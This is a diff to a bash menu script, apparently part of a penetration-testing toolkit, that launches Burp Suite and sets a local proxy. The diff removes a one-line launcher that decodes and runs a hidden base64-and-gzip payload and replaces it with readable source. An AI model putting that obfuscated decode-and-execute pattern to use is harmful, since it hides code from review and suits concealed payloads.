@@ -1,1 +1,95 @@
-bash -c "$(echo H4sICEp9cGcAA1R3b19vZl9IZWFydHMAtVZhb9s2EP2uX3FzgzUeasmOi62Q0QJZkG4B1iJoXAxDVhi0dLK0yaJAUnaM1P99R8q2KFt2tS2hv0jk6d3x3d07v/jOmyaZN2UydpyrPy4/vn35Z384vB+Mhj/OXzqfru+ux5utPr07L+ADZgVEXICKEcZLDjyCX5EJJeGKidBRSz7h0SQ2W5M5WZ934dEBWkFKm+YJg5hDD6Fz9qidrjvVbgfMmjzVOoD+CidX/Uon19d22JfhgmUBhvA7TuEyz9MkYCrhGYxRqiSbtcV+Mkpaxv2fViP2OE4kBFQdkAu+SEKUwDJIMoUiYgGC4pCyIgti2g4h4FmUzAqB8HMhcrgrEoWvjmIzyPmScIqUYHhqSnNJRDOL6BwzVKJ8ViXpbpu4n5OT58QeuHCnqH4tAolt+OXzDcx5iP8L+8KFq12CbgV/WMEdKk3pN7qlBfbQhZt5zilwSuL1g3kiF39hoOB9kmJLD43Yr11CTNS/ibEl9rP0ZSmORn836iiQhdDLoXOt+wZWvBBAlkmAPkVSPpUyyyTCWblBaXe2oQ+6IHVVTKZUFdIUxWi0O73oVo03yU1erdNhF+YsYzNzpPMh7dPXXUDNbd/e/KG7YekmW7A0CTchujAWK2AzlmRuZwQyRcxhMILDubEFQ8kCZ61nz6midvbu1mLq/GY0RytwBem6bp32JCJe5nMtTL0FVNR9/84LceFlRZqO9CyseLZsSrepxN3hfgzXQnDh1+4kIeOKrkYXSlMM9+Kpqu+WLiZxa2hDRILPIVYql77n6S6Sy2Q2Q+GSDHo6PLfEihKrsjIYQE9CT5giuxUotUqv4G9caYEWqAqR6Sc9+HV+iKoS5jB1ZbqO6YSzV2gtUrWF0smqgx0krCSnbBIdalnLMZcKzkOMWJEqHwYXP7l9+g26/l53vaNmMp9M9CfmrHp9e/ZYvfi9Hcr6hGejYpXnN/03/RNOtbXlVL/unOoXv6cB1o0klcTsyA11suyA176NtD7Cm9QJM+oyFXwp6S76z54erVSZEpVGLajulB7qBs7tPGsZnR4Jzp4utSimD+YLu2FqiE20DHaTicHGE3VPirbNhbsNsMlml+urmHOij/4A8Vz/I/HL3GvzyYGK1w/qar57bKw9puIty3Ywei8xN/E7NYBaLZYWEw1SMyIxvL+HXkRUWiYd+PJlTwOPyd2tHYqNsXFJRSuLIKCioT906apB+w4U9RvK+v7Ak1bXiBdZk7JaqrhdtRnZinPJFnhI/Dm6M/cVeNrKU9zbHLpaj7unkoEPzck4ya2OoRQA6/MjF64N7YYb7g/wT6aHtRQTvmnhRjwzt6vbPLUwNOz+AwKsQrzODgAA | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+# Menu for the Two of Hearts Card
+two_of_hearts_menu() {
+    clear
+    echo -e "${CYAN}"
+    echo "      _________________________________________________________________________"
+    echo "     |                              Two of Hearts                              |"
+    echo "     |                    Advanced Web Application Testing                     |"
+    echo "     |_________________________________________________________________________|"
+    echo "     |                                                                         |"
+    echo "     |  This card provides an interface to launch and configure Burp Suite,    |"
+    echo "     |  a powerful tool for web application penetration testing.               |"
+    echo "     |                                                                         |"
+    echo "     |                                                                         |"
+    echo "     |  1. Start Burp Suite in GUI mode                                        |"
+    echo "     |  2. Configure Proxy Settings                                            |"
+    echo "     |  3. Import or Export Project Files                                      |"
+    echo "     |  4. Exit                                                                |"
+    echo "     |_________________________________________________________________________|"
+    echo -e "${RESET}"
+    read -p "Enter your choice: " choice
+    case $choice in
+        1) start_burpsuite ;;
+        2) configure_proxy ;;
+        3) manage_projects ;;
+        4) exit 0 ;;
+        *) echo "Invalid choice. Try again."; sleep 1; two_of_hearts_menu ;;
+    esac
+}
+
+# Start Burp Suite in GUI mode
+start_burpsuite() {
+    clear
+    echo -e "${CYAN}Launching Burp Suite...${RESET}"
+    if command -v burpsuite &>/dev/null; then
+        burpsuite &
+    else
+        echo -e "${CYAN}Error: Burp Suite is not installed.${RESET}"
+        echo "Please install Burp Suite from https://portswigger.net/burp."
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    two_of_hearts_menu
+}
+
+# Configure Proxy Settings
+configure_proxy() {
+    clear
+    echo -e "${CYAN}Configuring Proxy Settings...${RESET}"
+    echo "Enter the proxy host (default: 127.0.0.1):"
+    read -p "> " proxy_host
+    proxy_host=${proxy_host:-127.0.0.1}
+    echo "Enter the proxy port (default: 8080):"
+    read -p "> " proxy_port
+    proxy_port=${proxy_port:-8080}
+    echo -e "${CYAN}Proxy configured to ${proxy_host}:${proxy_port}.${RESET}"
+    echo "Ensure your browser or tool is set to use this proxy."
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    two_of_hearts_menu
+}
+
+# Import or Export Project Files
+manage_projects() {
+    clear
+    echo -e "${CYAN}Manage Burp Suite Project Files${RESET}"
+    echo "1. Import a project file"
+    echo "2. Export a project file"
+    read -p "Choose an option: " project_choice
+    case $project_choice in
+        1)
+            echo "Enter the path to the project file to import:"
+            read -p "> " import_path
+            if [[ -f "$import_path" ]]; then
+                echo -e "${CYAN}Project file $import_path imported successfully.${RESET}"
+            else
+                echo -e "${CYAN}Error: File $import_path not found.${RESET}"
+            fi
+            ;;
+        2)
+            echo "Enter the path to save the project file (e.g., /path/to/project.burp):"
+            read -p "> " export_path
+            echo -e "${CYAN}Project file saved to $export_path.${RESET}"
+            ;;
+        *)
+            echo "Invalid choice. Returning to menu."
+            ;;
+    esac
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    two_of_hearts_menu
+}
+
+two_of_hearts_menu
